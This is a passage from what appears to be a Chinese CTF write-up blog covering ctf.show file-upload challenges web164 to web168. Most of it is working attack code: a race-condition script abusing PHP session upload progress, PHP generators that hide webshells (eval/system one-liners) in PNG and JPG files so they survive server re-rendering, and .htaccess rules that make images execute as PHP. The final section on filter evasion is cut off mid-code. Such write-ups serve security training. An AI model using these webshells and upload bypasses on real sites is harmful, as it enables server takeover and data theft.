class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: yu22x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><h5 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h5><h6 id="png二次渲染"><a href="#png二次渲染" class="headerlink" title="png二次渲染"></a><strong>png二次渲染</strong></h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">二次渲染</span><br><span class="line">将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。</span><br></pre></td></tr></table></figure><p>详解链接：<a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">https://www.fujieace.com/penetration-test/upload-labs-pass-16.html</a></p><p>首先只能上传png文件，上传图片马，发现没有办法执行</p><p>在bp上发现图片中php代码没有了，猜测是进行了二次渲染</p><p>绕过二次渲染的png脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//imagepng($img,&#x27;1.png&#x27;);  要修改的图片的路径,1.png是使用的文件，可以不存在</span></span><br><span class="line"><span class="comment">//会在目录下自动创建一个1.png图片</span></span><br><span class="line"><span class="comment">//图片脚本内容：$_GET[0]($_POST[1]);</span></span><br><span class="line"><span class="comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">------------------------------------</span><br><span class="line">           创建<span class="number">1</span>.png图片成功！      </span><br><span class="line">------------------------------------</span><br></pre></td></tr></table></figure><p>运行该脚本即可生成一个图片文件1.png</p><p>上传该图片</p><p>查看图片并传入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;0=system</span><br><span class="line">1=<span class="built_in">tac</span> f*</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/309584a777bc33669ac5a6ff92972a88c31f2df3.png" alt="image-20211023205631934"></p><p>使用ctrl+s将图片下载下来，记事本打开即可</p><p><img src="https://i0.hdslb.com/bfs/album/374fad3b56b23e4977f6b936152b892b2c2febda.png" alt="image-20211023205717323"></p><h5 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h5><p><img src="https://i0.hdslb.com/bfs/album/9f09adc5c17393f23ae2d4df870a63e4704767aa.png" alt="image-20211023212147376"></p><h6 id="jpg二次渲染"><a href="#jpg二次渲染" class="headerlink" title="jpg二次渲染"></a><strong>jpg二次渲染</strong></h6><p>绕过二次渲染的jpg脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行该脚本生成一个payload_a.jpg </p><p>在题中上传图片，上传成功后，查看图片，然后进行POST传参</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1</span>=system(<span class="string">&#x27;tac f*&#x27;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h5 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h5><h6 id="application-x2F-x-zip-compressed"><a href="#application-x2F-x-zip-compressed" class="headerlink" title="application&#x2F;x-zip-compressed"></a>application&#x2F;x-zip-compressed</h6><p>查看源代码发现只能上传zip<br><img src="https://i0.hdslb.com/bfs/album/521b229cfe4737fd15caf9c340990190dfe69a14.png" alt="在这里插入图片描述"><br>那我们直接上传一句话就可以了<br><img src="https://i0.hdslb.com/bfs/album/4df0e7e3f8e01c0edb79b44de6e1ada82c0abca5.png" alt="在这里插入图片描述"><br>注意修改Content-Type为application&#x2F;x-zip-compressed<br>然后直接文件包含就可以了<br><img src="https://i0.hdslb.com/bfs/album/d483b2f65612a6a15b2df3618c391d4be5a937c5.png" alt="在这里插入图片描述"></p><h5 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h5><h6 id="htaccess-1"><a href="#htaccess-1" class="headerlink" title=".htaccess"></a>.htaccess</h6><p>开局一个提示</p><p><img src="https://i0.hdslb.com/bfs/album/73b2f97f7168eebecdaca2086b1262b9111c6bbd.png" alt="在这里插入图片描述"></p><p>说明和apache有关，一开始以为是apache解析漏洞，然后上传a.php.xxx也没有被解析成php。<br>那应该是要利用.htaccess进行绕过了</p><p>首先上传.htaccess<br>方式1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</span><br></pre></td></tr></table></figure><p>方式2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>PS：如果flag不是php文件，那么还可以像.user.ini一样在当前目录加载一个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &#x27;flag&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/0bcb59a6717d427c430cdc71db9aafee483648cb.png" alt="在这里插入图片描述"></p><p>然后上传图片一句话</p><p><img src="https://i0.hdslb.com/bfs/album/4f7f357913434c3f5065a5254fdc9d3708519844.png" alt="在这里插入图片描述"></p><p>最后直接访问就可以了</p><p><img src="https://i0.hdslb.com/bfs/album/0bcb59a6717d427c430cdc71db9aafee483648cb.png" alt="在这里插入图片描述"></p><h5 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h5><h6 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h6><p><img src="https://i0.hdslb.com/bfs/album/4df089d9a30c11d491daf2af7792c940906c5fa0.png" alt="image-20211029164111089"></p><p>需要上传png文件</p><p>尝试上传一句话，发现返回为空</p><p><img src="https://i0.hdslb.com/bfs/album/2fc37e801217d6a6e734c37916279a43284ece60.png" alt="image-20211029170204510"></p><p>说明被过滤了</p><p>尝试后发现过滤了 eval system  <code>$_POST $_GET</code> 等等</p><p>下面是另外的免杀代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 